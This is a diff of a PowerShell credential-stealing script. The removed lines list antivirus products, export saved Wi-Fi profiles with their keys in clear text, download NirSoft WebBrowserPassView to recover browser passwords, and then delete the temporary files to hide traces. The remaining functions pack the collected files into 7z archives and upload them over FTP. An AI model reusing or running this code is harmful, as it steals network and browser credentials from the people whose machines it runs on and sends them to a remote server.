@@ -1,30 +1,3 @@
-$desktop = ([Environment]::GetFolderPath("Desktop"))
-
-
-function GetVersion {
-   mkdir \temp 
-   cd \temp
-   Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\Version.txt -Encoding utf8
-}
-
-
-function GetWifi {
-   New-Item -Path $env:temp -Name "8ad3rror" -ItemType "directory"
-   Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
-   Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} | Out-File "C:\temp\Wifi.txt"
-}
-
-
-function GetNirsoft {
-  mkdir \temp 
-  cd \temp
-  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
-  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
-  Expand-Archive 7z.zip 
-  .\7z\7za.exe e wbpv.zip
-}
-
-
 function Create7z {
     $tempFolder = "C:\temp"
     if (-not (Test-Path $tempFolder)) {
@@ -76,7 +49,6 @@ function Create7z {
     }
 }
 
-
 function UploadFTP {
     [CmdletBinding()]
     param (
@@ -122,7 +94,6 @@ function UploadFTP {
     }
 }
 
-
 function Up7z {
   $files = Get-ChildItem -Path "C:\temp" -Filter "tom*.7z"
 
@@ -142,21 +113,5 @@ function Up7z {
 }
 }
 
-
-function DelAll {
-   cd C:\
-   rmdir -R \temp
-   Set-Location -Path "$env:temp"
-   Remove-Item -Path "$env:tmp/8ad3rror" -Force -Recurse;rm $C:\temp\Wifi.txt
-}
-
-
-
-
-
-
-GetVersion
-GetWifi
-GetNirsoft
 
 
